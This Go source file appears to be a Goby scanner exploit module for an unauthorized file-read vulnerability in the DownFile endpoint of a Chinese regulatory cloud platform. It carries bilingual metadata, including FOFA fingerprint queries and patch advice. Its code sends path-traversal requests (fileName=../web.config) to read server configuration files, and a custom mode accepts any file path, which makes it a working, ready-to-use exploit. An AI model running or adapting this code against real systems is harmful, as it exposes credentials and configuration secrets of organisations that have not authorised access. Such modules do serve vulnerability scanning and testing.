package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "CSIG Comprehensive supervision Cloud Platform DownFile File Read Vulnerability",
    "Description": "<p>CSIG Comprehensive supervision Cloud Platform is an information platform integrating a variety of advanced technologies, aiming to achieve comprehensive, efficient and accurate management of various regulatory objects through data collection, analysis, early warning and emergency handling functions. The integrated regulatory cloud platform uses the \"Internet + Internet of Things\" model. Combining advanced technologies such as cloud computing, big data and edge computing, an information supervision platform has been built that integrates functions such as data collection, statistical analysis, regulatory early warning and emergency safety. </p><p>The DownFile interface has an unauthorized file read vulnerability, which allows an unauthorized attacker to read systemically important files, leaving the website in an insecure state.</p>",
    "Product": "CSIG Comprehensive supervision Cloud Platform",
    "Homepage": "http://www.18sz.com/index.php?homepage=radar&file=sell",
    "DisclosureDate": "2024-08-20",
    "PostTime": "2024-08-22",
    "Author": "hhh3156",
    "FofaQuery": "(body=\"/Scripts/USBKey/Syunew6.js\" && body=\"/Download/DownFile?fileName=SetUp.exe\" )|| body=\"hm.baidu.com/hm.js?0558502420ce5fee054b31425e77ffa6\" || (body=\"服务器启用了Identity认证，强制在这里登录\" && body=\"推荐Firefox浏览器\")",
    "GobyQuery": "(body=\"/Scripts/USBKey/Syunew6.js\" && body=\"/Download/DownFile?fileName=SetUp.exe\" )|| body=\"hm.baidu.com/hm.js?0558502420ce5fee054b31425e77ffa6\" || (body=\"服务器启用了Identity认证，强制在这里登录\" && body=\"推荐Firefox浏览器\")",
    "Level": "1",
    "Impact": "<p>The DownFile interface has an unauthorized file read vulnerability, which allows an unauthorized attacker to read systemically important files, leaving the website in an insecure state.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.18sz.com/index.php?homepage=radar&amp;file=sell\">http://www.18sz.com/index.php?homepage=radar&amp;file=sell</a></p><p>2. Deploy a web application firewall. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.config,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "中科智远科技-综合监管云平台 DownFile 文件读取漏洞",
            "Product": "中科智远科技-综合监管云平台",
            "Description": "<p>中科智远科技有限公司-综合监管云平台是一种集成了多种先进技术的信息化平台，旨在通过数据采集、分析、预警和应急处理等功能，实现对各类监管对象的全面、高效、精准管理，综合监管云平台利用“互联网+物联网”模式，结合云计算、大数据、边缘计算等先进技术，构建了一个集数据采集、统计分析、监管预警、应急安全等功能于一体的信息化监管平台。<br></p><p>其 DownFile 接口存在未授权文件读取漏洞，未经授权的攻击者可通过该漏洞读取系统重要⽂件，导致⽹站处于不安全状态。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.18sz.com/index.php?homepage=radar&amp;file=sell\">http://www.18sz.com/index.php?homepage=radar&amp;file=sell</a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其&nbsp;DownFile 接口存在未授权文件读取漏洞，未经授权的攻击者可通过该漏洞读取系统重要⽂件，导致⽹站处于不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "CSIG Comprehensive supervision Cloud Platform DownFile File Read Vulnerability",
            "Product": "CSIG Comprehensive supervision Cloud Platform",
            "Description": "<p>CSIG Comprehensive supervision Cloud Platform is an information platform integrating a variety of advanced technologies, aiming to achieve comprehensive, efficient and accurate management of various regulatory objects through data collection, analysis, early warning and emergency handling functions. The integrated regulatory cloud platform uses the \"Internet + Internet of Things\" model. Combining advanced technologies such as cloud computing, big data and edge computing, an information supervision platform has been built that integrates functions such as data collection, statistical analysis, regulatory early warning and emergency safety.&nbsp;</p><p>The DownFile interface has an unauthorized file read vulnerability, which allows an unauthorized attacker to read systemically important files, leaving the website in an insecure state.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.18sz.com/index.php?homepage=radar&amp;file=sell\">http://www.18sz.com/index.php?homepage=radar&amp;file=sell</a></p><p>2. Deploy a web application firewall.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The DownFile interface has an unauthorized file read vulnerability, which allows an unauthorized attacker to read systemically important files, leaving the website in an insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9942"
}`

	postOrGet_AIHVUAbohghuAQYeygf8231LOAhuf021a := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/Download/DownFile?fileName=" + fileUrl
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/Download/DownFile?fileName=../web.config"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../web.config": "<configuration>",
			}
			// 函数继承
			uploadFileFunc := postOrGet_AIHVUAbohghuAQYeygf8231LOAhuf021a

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.FixedHostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.config": {"../web.config", "<configuration>"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_AIHVUAbohghuAQYeygf8231LOAhuf021a

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
